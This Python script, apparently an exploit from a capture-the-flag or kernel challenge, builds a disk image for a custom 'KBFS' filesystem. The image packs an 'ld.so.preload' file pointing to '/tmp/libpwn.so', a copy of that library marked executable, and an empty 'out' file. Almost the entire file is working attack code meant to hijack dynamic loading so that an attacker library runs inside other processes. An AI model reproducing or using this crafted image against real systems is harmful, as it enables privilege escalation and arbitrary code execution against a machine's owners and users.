import struct
from pathlib import Path

BLOCKSIZE = 0x1000
KBFS_MAGIC = 0x5346424b
KBFS_VERSION = 1
DNODE_SIZE = 24
FNAME_MAX = 0xF7


def pack_dnode(mode, inuse, uid, gid, size, table):
    data = struct.pack("<HHHHQI", mode, inuse, uid, gid, size, table)
    return data + bytes(DNODE_SIZE - len(data))


def pack_fentry(dnode_no, name):
    name_bytes = name.encode("ascii")
    if len(name_bytes) >= FNAME_MAX:
        raise ValueError("Name too long")
    name_bytes += bytes([0])
    name_bytes += bytes(FNAME_MAX - len(name_bytes))
    return struct.pack("<Q", dnode_no) + name_bytes


ld_preload = b"/tmp/libpwn.so\n"
lib_data = Path("libpwn.so").read_bytes()
lib_blocks = (len(lib_data) + BLOCKSIZE - 1) // BLOCKSIZE

block_alloc = {}
block_alloc["dir"] = 3
block_alloc["ld_table"] = 4
block_alloc["ld_data"] = [5]
block_alloc["lib_table"] = 6
block_alloc["lib_data"] = list(range(7, 7 + lib_blocks))
block_alloc["out_table"] = 7 + lib_blocks
block_alloc["out_data"] = [block_alloc["out_table"] + 1]

used_blocks = {0, 1, 2}
for key in ("dir", "ld_table", "lib_table", "out_table"):
    used_blocks.add(block_alloc[key])
for key in ("ld_data", "lib_data", "out_data"):
    used_blocks.update(block_alloc[key])

total_blocks = max(used_blocks) + 1
img = bytearray(BLOCKSIZE * total_blocks)
struct.pack_into("<IIII", img, 0, KBFS_MAGIC, KBFS_VERSION, BLOCKSIZE, total_blocks)

offset = BLOCKSIZE
root_dnode = pack_dnode(0o40755, 1, 0, 0, BLOCKSIZE, block_alloc["dir"])
ld_size = len(ld_preload)
ld_dnode = pack_dnode(0o100644, 1, 0, 0, ld_size, block_alloc["ld_table"])
lib_dnode = pack_dnode(0o100755, 1, 0, 0, len(lib_data), block_alloc["lib_table"])
out_dnode = pack_dnode(0o100644, 1, 0, 0, 0, block_alloc["out_table"])
dnode_block = root_dnode + ld_dnode + lib_dnode + out_dnode
img[offset:offset + len(dnode_block)] = dnode_block

bitmap = bytearray(BLOCKSIZE)
for idx in used_blocks:
    bitmap[idx] = 1
img[2 * BLOCKSIZE:3 * BLOCKSIZE] = bitmap

entries = [
    pack_fentry(1, "ld.so.preload"),
    pack_fentry(2, "libpwn.so"),
    pack_fentry(3, "out"),
]
entries_blob = b"".join(entries)
dir_block = struct.pack("<Q", len(entries)) + entries_blob
dir_off = block_alloc["dir"] * BLOCKSIZE
img[dir_off:dir_off + len(dir_block)] = dir_block

ld_table = bytearray(BLOCKSIZE)
ld_table[0] = block_alloc["ld_data"][0]
img[block_alloc["ld_table"] * BLOCKSIZE:(block_alloc["ld_table"] + 1) * BLOCKSIZE] = ld_table

ld_data_block = ld_preload + bytes(BLOCKSIZE - len(ld_preload))
img[block_alloc["ld_data"][0] * BLOCKSIZE:(block_alloc["ld_data"][0] + 1) * BLOCKSIZE] = ld_data_block

lib_table = bytearray(BLOCKSIZE)
for idx, blk in enumerate(block_alloc["lib_data"]):
    lib_table[idx] = blk
img[block_alloc["lib_table"] * BLOCKSIZE:(block_alloc["lib_table"] + 1) * BLOCKSIZE] = lib_table

lib_padded = lib_data + bytes(len(block_alloc["lib_data"]) * BLOCKSIZE - len(lib_data))
for i, blk in enumerate(block_alloc["lib_data"]):
    start = i * BLOCKSIZE
    img[blk * BLOCKSIZE:(blk + 1) * BLOCKSIZE] = lib_padded[start:start + BLOCKSIZE]

out_table = bytearray(BLOCKSIZE)
out_table[0] = block_alloc["out_data"][0]
img[block_alloc["out_table"] * BLOCKSIZE:(block_alloc["out_table"] + 1) * BLOCKSIZE] = out_table

out_block = bytes(BLOCKSIZE)
img[block_alloc["out_data"][0] * BLOCKSIZE:(block_alloc["out_data"][0] + 1) * BLOCKSIZE] = out_block

with open("kbfs_ldpreload.img", "wb") as f:
    f.write(img)
